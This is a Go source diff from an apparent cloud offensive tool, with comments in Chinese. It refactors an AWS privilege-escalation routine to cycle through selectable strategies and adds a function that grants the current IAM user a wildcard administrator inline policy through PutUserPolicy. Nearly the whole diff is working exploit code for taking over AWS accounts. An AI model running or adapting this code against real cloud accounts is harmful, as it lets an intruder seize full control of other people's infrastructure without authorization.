@@ -3998,7 +3998,7 @@ func (p *AWSProvider) ValidateCredentials() (bool, error) {
 }
 
 // EscalatePrivileges 权限提升 - 使用暴力枚举方法尝试不同的提权策略
-func (p *AWSProvider) EscalatePrivileges() (map[string]interface{}, error) {
+func (p *AWSProvider) EscalatePrivileges(escalationMethods []string) (map[string]interface{}, error) {
 	// 创建带有超时的上下文
 	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
 	defer cancel()
@@ -4020,122 +4020,60 @@ func (p *AWSProvider) EscalatePrivileges() (map[string]interface{}, error) {
 	attempts := []map[string]interface{}{}
 
 	// 提权策略列表
-	strategies := []string{"attachpolicy", "createrole", "assumerole", "instanceprofile"}
+	allStrategies := []string{"attachpolicy", "putuserpolicy", "createrole", "assumerole", "instanceprofile"}
 
-	// 1. 首先尝试 attachpolicy 策略 - 优先级最高
-	if success, details := p.attemptAttachPolicy(ctx); success {
-		successfulStrategies = append(successfulStrategies, "attachpolicy")
-		attempts = append(attempts, map[string]interface{}{
-			"strategy": "attachpolicy",
-			"status":   "success",
-			"details":  details,
-		})
-		// 如果成功，直接返回
-		return map[string]interface{}{
-			"message":              "Privilege escalation successful",
-			"accountId":            *callerIdentity.Account,
-			"strategies":           strategies,
-			"successfulStrategies": successfulStrategies,
-			"failedStrategies":     failedStrategies,
-			"attempts":             attempts,
-			"status":               "completed",
-			"timestamp":            time.Now().Format(time.RFC3339),
-		}, nil
-	} else {
-		failedStrategies = append(failedStrategies, "attachpolicy")
-		attempts = append(attempts, map[string]interface{}{
-			"strategy": "attachpolicy",
-			"status":   "failed",
-			"details":  details,
-		})
+	// 确定要执行的策略
+	strategies := allStrategies
+	if len(escalationMethods) > 0 {
+		strategies = escalationMethods
 	}
 
-	// 2. 尝试 createrole 策略
-	if success, details := p.attemptCreateRole(ctx); success {
-		successfulStrategies = append(successfulStrategies, "createrole")
-		attempts = append(attempts, map[string]interface{}{
-			"strategy": "createrole",
-			"status":   "success",
-			"details":  details,
-		})
-		return map[string]interface{}{
-			"message":              "Privilege escalation successful",
-			"accountId":            *callerIdentity.Account,
-			"strategies":           strategies,
-			"successfulStrategies": successfulStrategies,
-			"failedStrategies":     failedStrategies,
-			"attempts":             attempts,
-			"status":               "completed",
-			"timestamp":            time.Now().Format(time.RFC3339),
-		}, nil
-	} else {
-		failedStrategies = append(failedStrategies, "createrole")
-		attempts = append(attempts, map[string]interface{}{
-			"strategy": "createrole",
-			"status":   "failed",
-			"details":  details,
-		})
+	// 策略执行映射
+	strategyMap := map[string]func(context.Context) (bool, map[string]interface{}){
+		"attachpolicy":    p.attemptAttachPolicy,
+		"putuserpolicy":   p.attemptPutUserPolicy,
+		"createrole":      p.attemptCreateRole,
+		"assumerole":      p.attemptAssumeRole,
+		"instanceprofile": p.attemptInstanceProfile,
 	}
 
-	// 3. 尝试 assumerole 策略
-	if success, details := p.attemptAssumeRole(ctx); success {
-		successfulStrategies = append(successfulStrategies, "assumerole")
-		attempts = append(attempts, map[string]interface{}{
-			"strategy": "assumerole",
-			"status":   "success",
-			"details":  details,
-		})
-		return map[string]interface{}{
-			"message":              "Privilege escalation successful",
-			"accountId":            *callerIdentity.Account,
-			"strategies":           strategies,
-			"successfulStrategies": successfulStrategies,
-			"failedStrategies":     failedStrategies,
-			"attempts":             attempts,
-			"status":               "completed",
-			"timestamp":            time.Now().Format(time.RFC3339),
-		}, nil
-	} else {
-		failedStrategies = append(failedStrategies, "assumerole")
-		attempts = append(attempts, map[string]interface{}{
-			"strategy": "assumerole",
-			"status":   "failed",
-			"details":  details,
-		})
-	}
-
-	// 4. 尝试 instanceprofile 策略
-	if success, details := p.attemptInstanceProfile(ctx); success {
-		successfulStrategies = append(successfulStrategies, "instanceprofile")
-		attempts = append(attempts, map[string]interface{}{
-			"strategy": "instanceprofile",
-			"status":   "success",
-			"details":  details,
-		})
-		return map[string]interface{}{
-			"message":              "Privilege escalation successful",
-			"accountId":            *callerIdentity.Account,
-			"strategies":           strategies,
-			"successfulStrategies": successfulStrategies,
-			"failedStrategies":     failedStrategies,
-			"attempts":             attempts,
-			"status":               "completed",
-			"timestamp":            time.Now().Format(time.RFC3339),
-		}, nil
-	} else {
-		failedStrategies = append(failedStrategies, "instanceprofile")
-		attempts = append(attempts, map[string]interface{}{
-			"strategy": "instanceprofile",
-			"status":   "failed",
-			"details":  details,
-		})
+	// 执行指定的策略
+	for _, strategy := range strategies {
+		if attemptFunc, exists := strategyMap[strategy]; exists {
+			if success, details := attemptFunc(ctx); success {
+				successfulStrategies = append(successfulStrategies, strategy)
+				attempts = append(attempts, map[string]interface{}{
+					"strategy": strategy,
+					"status":   "success",
+					"details":  details,
+				})
+				// 如果成功，直接返回
+				return map[string]interface{}{
+					"message":              "Privilege escalation successful",
+					"accountId":            *callerIdentity.Account,
+					"strategies":           allStrategies,
+					"successfulStrategies": successfulStrategies,
+					"failedStrategies":     failedStrategies,
+					"attempts":             attempts,
+					"status":               "completed",
+					"timestamp":            time.Now().Format(time.RFC3339),
+				}, nil
+			} else {
+				failedStrategies = append(failedStrategies, strategy)
+				attempts = append(attempts, map[string]interface{}{
+					"strategy": strategy,
+					"status":   "failed",
+					"details":  details,
+				})
+			}
+		}
 	}
 
 	// 如果所有策略都失败
 	return map[string]interface{}{
 		"message":              "All privilege escalation strategies failed",
 		"accountId":            *callerIdentity.Account,
-		"strategies":           strategies,
+		"strategies":           allStrategies,
 		"successfulStrategies": successfulStrategies,
 		"failedStrategies":     failedStrategies,
 		"attempts":             attempts,
@@ -4476,6 +4414,97 @@ func (p *AWSProvider) attemptInstanceProfile(ctx context.Context) (bool, map[str
 	details["steps"] = steps
 	details["profileName"] = profileName
 	details["roleName"] = roleName
+	details["success"] = true
+	return true, details
+}
+
+// attemptPutUserPolicy 尝试使用 putuserpolicy 策略提权
+func (p *AWSProvider) attemptPutUserPolicy(ctx context.Context) (bool, map[string]interface{}) {
+	steps := []string{}
+	details := map[string]interface{}{
+		"attempt": "Putting AdministratorAccess inline policy to current user",
+	}
+
+	// 1. 首先检查用户是否有 iam:PutUserPolicy 权限
+	steps = append(steps, "Checking if user has iam:PutUserPolicy permission")
+
+	// 2. 创建STS客户端获取当前用户信息
+	stsClient, err := p.createSTSClient()
+	if err != nil {
+		steps = append(steps, "Failed to create STS client: "+err.Error())
+		details["steps"] = steps
+		details["error"] = err.Error()
+		return false, details
+	}
+
+	// 3. 获取当前调用者身份
+	callerIdentity, err := stsClient.GetCallerIdentity(ctx, &sts.GetCallerIdentityInput{})
+	if err != nil {
+		steps = append(steps, "Failed to get caller identity: "+err.Error())
+		details["steps"] = steps
+		details["error"] = err.Error()
+		return false, details
+	}
+
+	// 4. 从ARN中提取用户名
+	arn := *callerIdentity.Arn
+	steps = append(steps, "Current identity ARN: "+arn)
+
+	// 5. 解析ARN获取用户名
+	// ARN格式: arn:aws:iam::account-id:user/user-name
+	parts := strings.Split(arn, ":")
+	if len(parts) < 6 {
+		steps = append(steps, "Invalid ARN format: "+arn)
+		details["steps"] = steps
+		details["error"] = "Invalid ARN format"
+		return false, details
+	}
+
+	resourcePart := parts[5]
+	resourceParts := strings.Split(resourcePart, "/")
+	if len(resourceParts) < 2 || resourceParts[0] != "user" {
+		steps = append(steps, "Not a user ARN: "+arn)
+		details["steps"] = steps
+		details["error"] = "Not a user ARN"
+		return false, details
+	}
+
+	userName := resourceParts[1]
+	steps = append(steps, "Current user: "+userName)
+
+	// 6. 管理员权限策略文档
+	policyName := "escalation-admin-policy-" + time.Now().Format("20060102150405")
+	policyDocument := `{
+		"Version": "2012-10-17",
+		"Statement": [
+			{
+				"Effect": "Allow",
+				"Action": "*",
+				"Resource": "*"
+			}
+		]
+	}`
+
+	steps = append(steps, "Putting inline policy: "+policyName)
+
+	// 7. 尝试将内联策略添加到用户
+	putPolicyInput := &iam.PutUserPolicyInput{
+		UserName:       aws.String(userName),
+		PolicyName:     aws.String(policyName),
+		PolicyDocument: aws.String(policyDocument),
+	}
+
+	_, err = p.iamClient.PutUserPolicy(ctx, putPolicyInput)
+	if err != nil {
+		steps = append(steps, "Failed to put user policy: "+err.Error())
+		details["steps"] = steps
+		details["error"] = err.Error()
+		return false, details
+	}
+
+	steps = append(steps, "Inline policy added successfully")
+	details["steps"] = steps
+	details["policyName"] = policyName
 	details["success"] = true
 	return true, details
 }
